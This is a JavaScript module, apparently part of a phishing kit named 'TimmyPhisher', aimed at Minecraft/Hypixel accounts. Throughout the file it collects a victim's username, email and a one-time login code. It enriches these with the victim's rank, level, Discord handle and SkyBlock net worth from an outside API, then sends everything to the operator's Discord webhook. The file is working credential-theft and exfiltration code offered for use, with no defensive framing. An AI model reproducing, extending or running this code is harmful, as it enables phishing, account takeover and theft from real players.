const axios = require('axios')
const { WebhookClient } = require('discord.js');
import ('node-fetch')

const customAvatarURL = 'https://bigrat.monster/media/bigrat.jpg';
const customUsername = 'TimmyPhisher';

async function getPlayerData(username) {
  let url = `https://worried-tuna-bedclothes.cyclic.app//v2/profiles/${username}`
  let config = {
      headers: {
          'Authorization': 'timmyauthz'
      }
  }

  try {
      let response = await axios.get(url, config)
      return [response.data.data[0]['rank'], response.data.data[0]['hypixelLevel']]
  } catch (error) {
      return ["API DOWN", 0.0]
  }
}

async function getPlayerStatus(username) {
  try {
    let url = `https://worried-tuna-bedclothes.cyclic.app//v2/status/${username}`
    let config = {
      headers: {
        'Authorization': 'timmyauthz'
      }
    }
    let response = await axios.get(url, config)
    return response.data.data.online
  } catch (error) {
    return "API DOWN"
  }
}

async function getPlayerDiscord(username) {
  try {
    let url = `https://worried-tuna-bedclothes.cyclic.app//v2/discord/${username}`;
    let config = {
      headers: {
        Authorization: "timmyauthz"
      }
    };
    let response = await axios.get(url, config);
    if (response.data.data.socialMedia.links == null) {
      return response.data.data.socialMedia;
    } else {
      return response.data.data.socialMedia.links.DISCORD;
    }
  } catch (error) {
    return "API DOWN";
  }
}

async function getNetworth(username) {
  try {
    let url = `https://worried-tuna-bedclothes.cyclic.app//v2/profiles/${username}`;
    let config = {
      headers: {
        Authorization: "timmyauthz"
      }
    };
    let response = await axios.get(url, config);
    return [
      response.data.data[0]["networth"],
      response.data.data[0].networth["noInventory"],
      response.data.data[0].networth["networth"],
      response.data.data[0].networth["unsoulboundNetworth"],
      response.data.data[0].networth["soulboundNetworth"]
    ];
  } catch (error) {
    return ["API DOWN", "API DOWN", "API DOWN", "API DOWN", "API DOWN",]
  }
}

const formatNumber = (num) => {
  if (num < 1000) return num.toFixed(2)
  else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
  else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
  else return `${(num / 1000000000).toFixed(2)}b`
}

function modifyRankField(token) {
  return token && token.length > 2 ? token.substring(2) : '';
} 

async function discordEmbed (username, email) {
  const networthArray = await getNetworth(username)
  const networth = networthArray[0]
  const networthNoInventory = networthArray[1]
  const networthNetworth = networthArray[2]
  const networthUnsoulbound = networthArray[3]
  const networthSoulbound = networthArray[4]

  let total_networth
  // Set it "API IS TURNED OFF IF NULL"
  if (networth == "API DOWN") total_networth = networth;
  else if (networth == "[NO PROFILES FOUND]") total_networth = networth;
  else if(networthNoInventory) total_networth = "NO INVENTORY: "+formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";
  else total_networth = formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";

  const playerData = await getPlayerData(username);
  const preRank = playerData[0];
  const rank = modifyRankField(preRank);
  const level = playerData[1].toFixed();
  const discord = await getPlayerDiscord(username);
  const status = await getPlayerStatus(username);
  const discordMessage = {
    username: customUsername,
    avatarURL: customAvatarURL,
    content: `@everyone`,
    embeds: [
      {
        timestamp: new Date(),
        fields: [
          {
            name: '**🎯 Username:**',
            value: '```' + username + '```',
            inline: true,
          },
          {
            name: '**📩 Email:**',
            value: '```' + email + '```',
            inline: true,
          },
          {
            name: `**💰 Networth:**`,
            value: '```'+ total_networth +'```',
            inline: true,
          },
          {
            name: `**📡 Discord:**`,
            value: '```'+ discord +'```',
            inline: true,
          },
          {
            name: `**🌐 Status:**`,
            value: '```'+ status +'```',
            inline: true,
          },
          {
            name: `**🏅 Rank:**`,
            value: '```'+ rank +'```',
            inline: true,
          },
          {
            name: `**📊 Level:**`,
            value: '```'+ level +'```',
            inline: true,
          },
        ],
        footer: {
          text: 'TimmyPhisher - by Timmy',
          iconURL: 'https://bigrat.monster/media/bigrat.jpg',
      },
      },
    ],
  };
  return discordMessage
}

async function discordEmbed2 (username, email, code) {
  const networthArray = await getNetworth(username)
  const networth = networthArray[0]
  const networthNoInventory = networthArray[1]
  const networthNetworth = networthArray[2]
  const networthUnsoulbound = networthArray[3]
  const networthSoulbound = networthArray[4]

  let total_networth
  // Set it "API IS TURNED OFF IF NULL"
  if (networth == "API DOWN") total_networth = networth;
  else if (networth == "[NO PROFILES FOUND]") total_networth = networth;
  else if(networthNoInventory) total_networth = "NO INVENTORY: "+formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";
  else total_networth = formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";

  const playerData = await getPlayerData(username);
  const preRank = playerData[0];
  const rank = modifyRankField(preRank);
  const level = playerData[1].toFixed();
  const discord = await getPlayerDiscord(username);
  const status = await getPlayerStatus(username);
  const discordMessage = {
    username: customUsername,
    avatarURL: customAvatarURL,
    content: `@everyone`,
    embeds: [
      {
        timestamp: new Date(),
        fields: [
          {
            name: '**🎯 Username:**',
            value: '```' + username + '```',
            inline: true,
          },
          {
            name: '**📩 Email:**',
            value: '```' + email + '```',
            inline: true,
          },
          {
            name: `**💰 Networth:**`,
            value: '```'+ total_networth +'```',
            inline: true,
          },
          {
            name: `**📡 Discord:**`,
            value: '```'+ discord +'```',
            inline: true,
          },
          {
            name: `**🌐 Status:**`,
            value: '```'+ status +'```',
            inline: true,
          },
          {
            name: `**🏅 Rank:**`,
            value: '```'+ rank +'```',
            inline: true,
          },
          {
            name: `**📊 Level:**`,
            value: '```'+ level +'```',
            inline: true,
          },
          {
            name: '**🔓 Code:**',
            value: '```'+ code +'```',
          },
        ],
        footer: {
          text: 'TimmyPhisher - by Timmy',
          iconURL: 'https://bigrat.monster/media/bigrat.jpg',
      },
      },
    ],
  };
  return discordMessage
}

async function sendDiscordMessage(username, email) {
  try {
    const messageContent = await discordEmbed(username, email);
    const { webhookUrl } = require('./config.json');

    if (!webhookUrl) {
      console.error('Webhook URL not found or invalid.');
      return { error: 'Webhook URL not found or invalid' };
    }

    const webhookClient = new WebhookClient({
      url: webhookUrl,
    });
    
    await webhookClient.send(messageContent);
    console.log(`Sent the message`);
    return { success: true };
  } catch (error) {
    console.error('Error sending Discord message:', error.message);
    return { error: 'Failed to send Discord message' };
  }
}

async function sendDiscordMessage2(username, email, code) {
    try {
      const messageContent = await discordEmbed2(username, email, code);
      const { webhookUrl } = require('./config.json');
  
      if (!webhookUrl) {
        console.error('Webhook URL not found or invalid.');
        return { error: 'Webhook URL not found or invalid' };
      }
  
      const webhookClient = new WebhookClient({
        url: webhookUrl,
      });
      
      await webhookClient.send(messageContent);
      console.log(`Sent the message`);
      return { success: true };
    } catch (error) {
      console.error('Error sending Discord message:', error.message);
      return { error: 'Failed to send Discord message' };
    }
  }

module.exports = { sendDiscordMessage, sendDiscordMessage2 };